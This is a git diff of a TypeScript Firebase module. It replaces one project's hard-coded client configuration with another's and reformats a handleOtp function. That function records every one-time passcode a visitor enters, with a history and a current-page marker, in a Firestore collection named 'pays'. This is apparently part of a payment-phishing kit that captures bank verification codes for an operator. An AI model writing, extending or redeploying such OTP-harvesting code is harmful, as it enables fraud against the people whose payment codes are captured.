@@ -1,17 +1,23 @@
 import { getApp, getApps, initializeApp } from "firebase/app";
 import { getDatabase } from "firebase/database";
 import { doc, getFirestore, setDoc } from "firebase/firestore";
-import { getAuth, signInWithEmailAndPassword, signOut, onAuthStateChanged, User } from "firebase/auth";
+import {
+  getAuth,
+  signInWithEmailAndPassword,
+  signOut,
+  onAuthStateChanged,
+  User,
+} from "firebase/auth";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyAZ-QH9QBmUHTVowsfYoK0BU1JMKd9pL-o",
-  authDomain: "dryah-875c0.firebaseapp.com",
-  databaseURL: "https://dryah-875c0-default-rtdb.firebaseio.com",
-  projectId: "dryah-875c0",
-  storageBucket: "dryah-875c0.firebasestorage.app",
-  messagingSenderId: "4984579245",
-  appId: "1:4984579245:web:819acd24e59d94fa0b9224",
-  measurementId: "G-DVKDRKT0S6",
+  apiKey: "AIzaSyBJwAk57JgSfu-nXlctc9t5M2b5A0yOH3o",
+  authDomain: "taminn-jh.firebaseapp.com",
+  databaseURL: "https://taminn-jh-default-rtdb.firebaseio.com",
+  projectId: "taminn-jh",
+  storageBucket: "taminn-jh.firebasestorage.app",
+  messagingSenderId: "910897215892",
+  appId: "1:910897215892:web:d4788788e3a66d94abb781",
+  measurementId: "G-MKE0PZWQEX",
 };
 
 function initializeFirebase() {
@@ -84,17 +90,23 @@ export const handleOtp = async (otp: string) => {
       const docRef = doc(db, "pays", visitorId);
       const otpEntry = {
         code: otp,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
       };
-      const existingOtps = JSON.parse(localStorage.getItem("otpHistory") || "[]");
+      const existingOtps = JSON.parse(
+        localStorage.getItem("otpHistory") || "[]",
+      );
       existingOtps.push(otpEntry);
       localStorage.setItem("otpHistory", JSON.stringify(existingOtps));
-      
-      await setDoc(docRef, { 
-        otp, 
-        otpHistory: existingOtps,
-        currentPage: "otp" 
-      }, { merge: true });
+
+      await setDoc(
+        docRef,
+        {
+          otp,
+          otpHistory: existingOtps,
+          currentPage: "otp",
+        },
+        { merge: true },
+      );
     } catch (error) {
       console.error("Error saving OTP:", error);
     }
